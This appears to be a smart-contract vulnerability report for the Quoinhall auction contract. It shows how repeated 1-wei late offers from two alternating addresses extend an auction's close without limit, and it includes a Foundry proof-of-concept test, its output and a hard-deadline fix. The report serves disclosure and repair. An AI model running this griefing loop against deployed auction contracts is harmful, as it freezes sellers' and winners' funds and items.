# Late offers keep a lot open indefinitely and freeze the seller's proceeds

## Summary
The soft close mechanism in Quoinhall allows attackers to indefinitely postpone the conclusion of an auction. The close can be pushed out without limit; every late offer extends `closesAt` again and nothing stops the attacker repeating it for days or weeks. This is an oversight; nothing in the code comments, the changelog or the programme page describes or accepts this behaviour.

## Severity
High

> Theft or permanent freezing of unclaimed refunds or accrued fees; temporary freezing of ETH or items for more than 7 days.

This fits the High severity row because the seller's proceeds and the winner's item are frozen for as long as the attacker likes. By keeping the auction open, the attacker completely blocks the settlement phase.

## Vulnerability details
When a user calls `placeOffer`, the contract calls an internal function to handle the soft close logic (`src/QuoinhallSaleroom.sol:L162-L166`):

```solidity
        lot.leader = msg.sender;

        _softClose(lot, lotId);

        emit OfferPlaced(lotId, msg.sender, msg.value);
```

Inside `_softClose`, the contract checks if the current time is within the final window (`src/QuoinhallSaleroom.sol:L172`):

```solidity
        if (lot.closesAt - block.timestamp > SOFT_CLOSE_WINDOW) return;
```

If it is, the contract pushes the deadline out by a fixed step (`src/QuoinhallSaleroom.sol:L176`):

```solidity
        lot.closesAt += SOFT_CLOSE_STEP;
```

Both constants are 20 minutes, and nothing bounds how often this happens. Each late offer moves `closesAt` another 20 minutes into the future and the next late offer is measured against the new value, so the close can be pushed out again and again for days or weeks. One offer every 20 minutes is 72 offers a day, 504 offers for 7 days.

A new offer only has to exceed the leading offer by a dust amount (say 1 wei), and by alternating two addresses the attacker's outbid ETH is credited back as a refund each round, so the attack costs gas only.

The code comments, the changelog and the programme page say nothing about a lot being held open this way. It is an oversight, not a design choice.

## Attack scenario
1. A seller consigns an item with a 1 ether reserve (the PoC uses a 1 hour lot).
2. Ten minutes before the close, the attacker's first address places the minimum valid offer. The close moves out by 20 minutes.
3. Ten minutes before the new close, the attacker uses a second address to place another offer, outbidding their first address by 1 wei.
4. The first address is credited its refund, and the close is extended again.
5. The attacker repeats this loop indefinitely, paying only gas. After 504 rounds the lot has been open for a week past its scheduled close.

## Impact
The seller's proceeds and the winner's item are frozen for as long as the attacker likes. The seller cannot be paid because `conclude()` reverts with `LotStillOpen` until the close has passed, and `collectItem()` has the same check. This maps exactly to the High severity row for temporary freezing of ETH or items for more than 7 days.

## Proof of concept
Save the following test file to `test/SoftClosePoC.t.sol` in your Foundry project.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {QuoinhallSaleroom} from "../src/QuoinhallSaleroom.sol";

contract MockERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external {}
}

contract SoftClosePoC is Test {
    QuoinhallSaleroom saleroom;
    MockERC721 mockNft;

    address attacker1 = address(0x111);
    address attacker2 = address(0x222);
    address seller = address(0x333);

    function setUp() public {
        saleroom = new QuoinhallSaleroom(address(this), 200);
        mockNft = new MockERC721();
        vm.deal(attacker1, 100 ether);
        vm.deal(attacker2, 100 ether);
    }

    function test_infiniteProlongation() public {
        vm.prank(seller);
        uint256 lotId = saleroom.consign(address(mockNft), 1, 1 ether, 1 hours);

        uint64 initialClose = saleroom.getLot(lotId).closesAt;
        console2.log("Scheduled close:", initialClose);

        vm.warp(initialClose - 10 minutes);

        for (uint256 i = 0; i < 5; i++) {
            address currentAttacker = i % 2 == 0 ? attacker1 : attacker2;
            uint256 minOffer = saleroom.minimumOffer(lotId);
            vm.prank(currentAttacker);
            saleroom.placeOffer{value: minOffer}(lotId);

            uint64 newClose = saleroom.getLot(lotId).closesAt;
            assertEq(newClose, initialClose + uint64((i + 1) * 20 minutes));
            console2.log("Late offer", i + 1, "-> close is now:", newClose);

            vm.warp(newClose - 10 minutes);
        }

        // 90 minutes after the lot was supposed to close it still cannot be concluded
        assertEq(block.timestamp, initialClose + 90 minutes);
        vm.expectRevert(QuoinhallSaleroom.LotStillOpen.selector);
        saleroom.conclude(lotId);

        assertEq(seller.balance, 0);
        console2.log("Seller balance 90 min after the scheduled close:", seller.balance);
    }
}
```

Run the proof of concept with this command:

```bash
forge test --match-test test_infiniteProlongation -vv
```

```
Ran 1 test for test/SoftClosePoC.t.sol:SoftClosePoC
[PASS] test_infiniteProlongation() (gas: 353604)
Logs:
  Scheduled close: 3601
  Late offer 1 -> close is now: 4801
  Late offer 2 -> close is now: 6001
  Late offer 3 -> close is now: 7201
  Late offer 4 -> close is now: 8401
  Late offer 5 -> close is now: 9601
  Seller balance 90 min after the scheduled close: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 873.10µs (395.10µs CPU time)

Ran 1 test suite in 7.41ms (873.10µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The output shows the attacker successfully pushing the close time out five times in a row. When `conclude()` is called 90 minutes after the scheduled close, it reverts with `LotStillOpen` and the seller's balance is still 0. This loop can simply be continued for as long as the attacker desires.

## Recommended fix
Add a hard deadline per lot so the soft close cannot be abused. Set it once in `consign` and stop extending when the next step would pass it.

```diff
--- src/QuoinhallSaleroom.sol
+++ src/QuoinhallSaleroom.sol
@@ -68,3 +68,4 @@
         uint256 leadingOffer;
         address leader;
         uint64 closesAt;
+        uint64 hardClose;
@@ -133,2 +134,3 @@
             leader: address(0),
             closesAt: closesAt,
+            hardClose: closesAt + 1 hours,
@@ -171,2 +173,3 @@
     function _softClose(Lot storage lot, uint256 lotId) internal {
         if (lot.closesAt - block.timestamp > SOFT_CLOSE_WINDOW) return;
+        if (lot.closesAt + SOFT_CLOSE_STEP > lot.hardClose) return;
```
